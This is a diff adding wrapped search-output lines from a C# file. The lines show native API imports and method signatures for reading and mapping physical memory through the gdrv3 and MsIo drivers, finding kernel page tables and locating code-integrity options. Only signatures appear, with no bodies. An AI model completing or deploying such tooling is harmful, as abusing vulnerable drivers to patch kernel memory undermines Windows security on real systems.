@@ -1,0 +1,290 @@
+
+_ritual\p36_prov.cs:20:pu
+blic static class P36Prov
+_ritual\p36_prov.cs:33:  
+  static extern IntPtr 
+CreateFileW(string name, 
+uint access, uint share, 
+IntPtr sa,
+_ritual\p36_prov.cs:36:  
+  static extern bool 
+DeviceIoControl(IntPtr 
+h, uint code, IntPtr 
+inBuf, uint inLen,
+_ritual\p36_prov.cs:39:  
+  static extern bool 
+CloseHandle(IntPtr h);
+_ritual\p36_prov.cs:41:  
+  static extern IntPtr 
+VirtualAlloc(IntPtr 
+addr, IntPtr size, uint 
+type, uint prot);
+_ritual\p36_prov.cs:43:  
+  static extern bool 
+VirtualFree(IntPtr addr, 
+IntPtr size, uint type);
+_ritual\p36_prov.cs:45:  
+  static extern bool 
+VirtualLock(IntPtr addr, 
+IntPtr size);
+_ritual\p36_prov.cs:47:  
+  static extern bool 
+VirtualUnlock(IntPtr 
+addr, IntPtr size);
+_ritual\p36_prov.cs:49:  
+  static extern bool 
+OpenProcessToken(IntPtr 
+proc, uint access, out 
+IntPtr tok);
+_ritual\p36_prov.cs:51:  
+  static extern bool Look
+upPrivilegeValueW(string 
+sys, string name, out 
+long luid);
+_ritual\p36_prov.cs:53:  
+  static extern bool Adju
+stTokenPrivileges(IntPtr 
+tok, bool disableAll,
+_ritual\p36_prov.cs:57:  
+  static extern int 
+NtOpenSection(out IntPtr 
+h, uint access, ref 
+OBJECT_ATTRIBUTES oa);
+_ritual\p36_prov.cs:59:  
+  static extern int NtMap
+ViewOfSection(IntPtr 
+sec, IntPtr proc, out 
+IntPtr baseAddr,
+_ritual\p36_prov.cs:64:  
+  static extern int NtUnm
+apViewOfSection(IntPtr 
+proc, IntPtr baseAddr);
+_ritual\p36_prov.cs:66:  
+  static extern int 
+NtClose(IntPtr h);
+_ritual\p36_prov.cs:81:  
+  public static string 
+EnablePriv(string name)
+_ritual\p36_prov.cs:108: 
+           g_Stage = Virt
+ualAlloc(IntPtr.Zero, 
+new IntPtr(size), 
+MEM_COMMIT | 
+MEM_RESERVE, 
+PAGE_READWRITE);
+_ritual\p36_prov.cs:109: 
+           if (g_Stage 
+== IntPtr.Zero) throw 
+new 
+Exception("VirtualAlloc 
+err=" + Marshal.GetLastWi
+n32Error());
+_ritual\p36_prov.cs:124: 
+   public static ulong[] 
+RamStarts = new ulong[0];
+_ritual\p36_prov.cs:125: 
+   public static ulong[] 
+RamEnds   = new ulong[0];
+_ritual\p36_prov.cs:126: 
+   public static ulong 
+RamTopFallback;
+_ritual\p36_prov.cs:128: 
+   public static Note 
+Notify;
+_ritual\p36_prov.cs:130: 
+   public static void 
+SetRamRanges(string csv, 
+ulong ramTopFallback)
+_ritual\p36_prov.cs:161: 
+   static extern int 
+RegOpenKeyEx(IntPtr 
+root, string sub, int 
+opt, int sam, out IntPtr 
+hk);
+_ritual\p36_prov.cs:163: 
+   static extern int 
+RegQueryValueEx(IntPtr 
+hk, string name, IntPtr 
+res, out int type, 
+byte[] data, ref int cb);
+_ritual\p36_prov.cs:165: 
+   static extern int 
+RegCloseKey(IntPtr hk);
+_ritual\p36_prov.cs:167: 
+   public static string 
+RamRangesFromRegistry()
+_ritual\p36_prov.cs:215: 
+   public static ulong[] 
+BadStarts = new ulong[0];
+_ritual\p36_prov.cs:216: 
+   public static ulong[] 
+BadEnds   = new ulong[0];
+_ritual\p36_prov.cs:218: 
+   public static void 
+SetBadRanges(string csv)
+_ritual\p36_prov.cs:238: 
+   public static bool 
+IsBad(ulong pa, int size)
+_ritual\p36_prov.cs:245: 
+   public static bool 
+InRam(ulong pa)
+_ritual\p36_prov.cs:260: 
+   public static bool 
+InRamSpan(ulong pa, int 
+size)
+_ritual\p36_prov.cs:269: 
+   public static bool 
+InRam(ulong pa, ulong 
+ramTop) { return 
+InRam(pa); }
+_ritual\p36_prov.cs:271: 
+   public static string 
+GdrvOpen(out IntPtr h)
+_ritual\p36_prov.cs:282: 
+   public static int 
+SkippedOutOfRam;   // 
+refused because the PA 
+is not backed by RAM
+_ritual\p36_prov.cs:283: 
+   public static int 
+Issued;            // 
+IOCTLs actually handed 
+to gdrv3
+_ritual\p36_prov.cs:284: 
+   public static ulong 
+LastIssuedPa;    // the 
+PA of the last IOCTL 
+(breadcrumb)
+_ritual\p36_prov.cs:287: 
+   public static byte[] 
+GdrvReadOneRaw(IntPtr h, 
+ulong pa, int size)
+_ritual\p36_prov.cs:313: 
+   public static byte[] 
+GdrvReadOne(IntPtr h, 
+ulong pa, int size)
+_ritual\p36_prov.cs:325: 
+   public static byte[] 
+GdrvRead(IntPtr h, ulong 
+pa, int size)
+_ritual\p36_prov.cs:342: 
+   public static string 
+SizeLadder(IntPtr g, 
+ulong pa, out string rep)
+_ritual\p36_prov.cs:361: 
+   public static string 
+SweepRead(IntPtr g, 
+ulong from, ulong to, 
+ulong step, out string 
+rep)
+_ritual\p36_prov.cs:381: 
+   public static ulong 
+RdQ(IntPtr h, ulong pa) 
+{ return BitConverter.ToU
+Int64(GdrvRead(h, pa, 
+8), 0); }
+_ritual\p36_prov.cs:382: 
+   public static uint 
+RdD(IntPtr h, ulong pa) 
+{ return BitConverter.ToU
+Int32(GdrvRead(h, pa, 
+4), 0); }
+_ritual\p36_prov.cs:384: 
+   public static string 
+Hex(byte[] b)
+_ritual\p36_prov.cs:391: 
+   public static string 
+PhysMemOpen(out IntPtr 
+section)
+_ritual\p36_prov.cs:422: 
+   public static string 
+PhysMemMap(IntPtr 
+section, ulong pa, uint 
+size, bool nocache,
+_ritual\p36_prov.cs:435: 
+   public static string 
+PhysMemUnmap(IntPtr 
+section, IntPtr view)
+_ritual\p36_prov.cs:443: 
+   public static string 
+MsIoOpen(out IntPtr h)
+_ritual\p36_prov.cs:455: 
+   public static string 
+MsIoTry(IntPtr h, int 
+shape, ulong pa, uint 
+size,
+_ritual\p36_prov.cs:479: 
+   public static string 
+GdrvMapTry(IntPtr h, 
+ulong pa, ulong size, 
+out ulong va, out uint 
+err)
+_ritual\p36_prov.cs:499: 
+   public static string 
+GdrvCopyTry(IntPtr h, 
+ulong a, ulong b, uint 
+n, out uint err)
+_ritual\p36_prov.cs:516: 
+   public static bool 
+CloseHandle2(IntPtr h) { 
+return CloseHandle(h); }
+_ritual\p36_prov.cs:518: 
+   public static bool 
+IsUserVa(ulong v)
+_ritual\p36_prov.cs:525: 
+   public static string 
+ReadAt(ulong va, int n)
+_ritual\p36_prov.cs:531: 
+   public static bool 
+WriteAt(ulong va, byte[] 
+data)
+_ritual\p36_prov.cs:538: 
+   static extern bool Get
+PhysicallyInstalledSystem
+Memory(out ulong kb);
+_ritual\p36_prov.cs:540: 
+   public static ulong 
+RamTop()
+_ritual\p36_prov.cs:549: 
+   public static string 
+ScanNtoskrnl(IntPtr g, 
+ulong ramTop, ulong 
+limit, out string hits)
+_ritual\p36_prov.cs:614: 
+   public static string 
+FindPml4(IntPtr g, ulong 
+ramTop, ulong limit, out 
+ulong cr3, out string 
+notes)
+_ritual\p36_prov.cs:639: 
+   public static bool 
+Walk(IntPtr g, ulong 
+cr3, ulong va, out ulong 
+pa)
+_ritual\p36_prov.cs:662: 
+   public static string 
+FindKernelVa(IntPtr g, 
+ulong cr3, ulong ntphys, 
+uint sizeOfImage,
+_ritual\p36_prov.cs:685: 
+   public static string 
+FindCiOptions(IntPtr g, 
+ulong cr3, ulong vaBase, 
+ulong physBase,
+_ritual\p36_prov.cs:718: 
+   public static string 
+MsIoMapTry2(IntPtr h, 
+int layout, ulong pa, 
+uint size, ulong q0len,
+_ritual\p36_prov.cs:746: 
+   public static string 
+MsIoUnmapTry(IntPtr h, 
+ulong q0, ulong q1, 
+ulong q2, ulong q3, 
+ulong q4,
+_ritual\p36_prov.cs:770: 
+   public static string 
+PhysMemOpenMask(uint 
+mask, out IntPtr section,
+
+
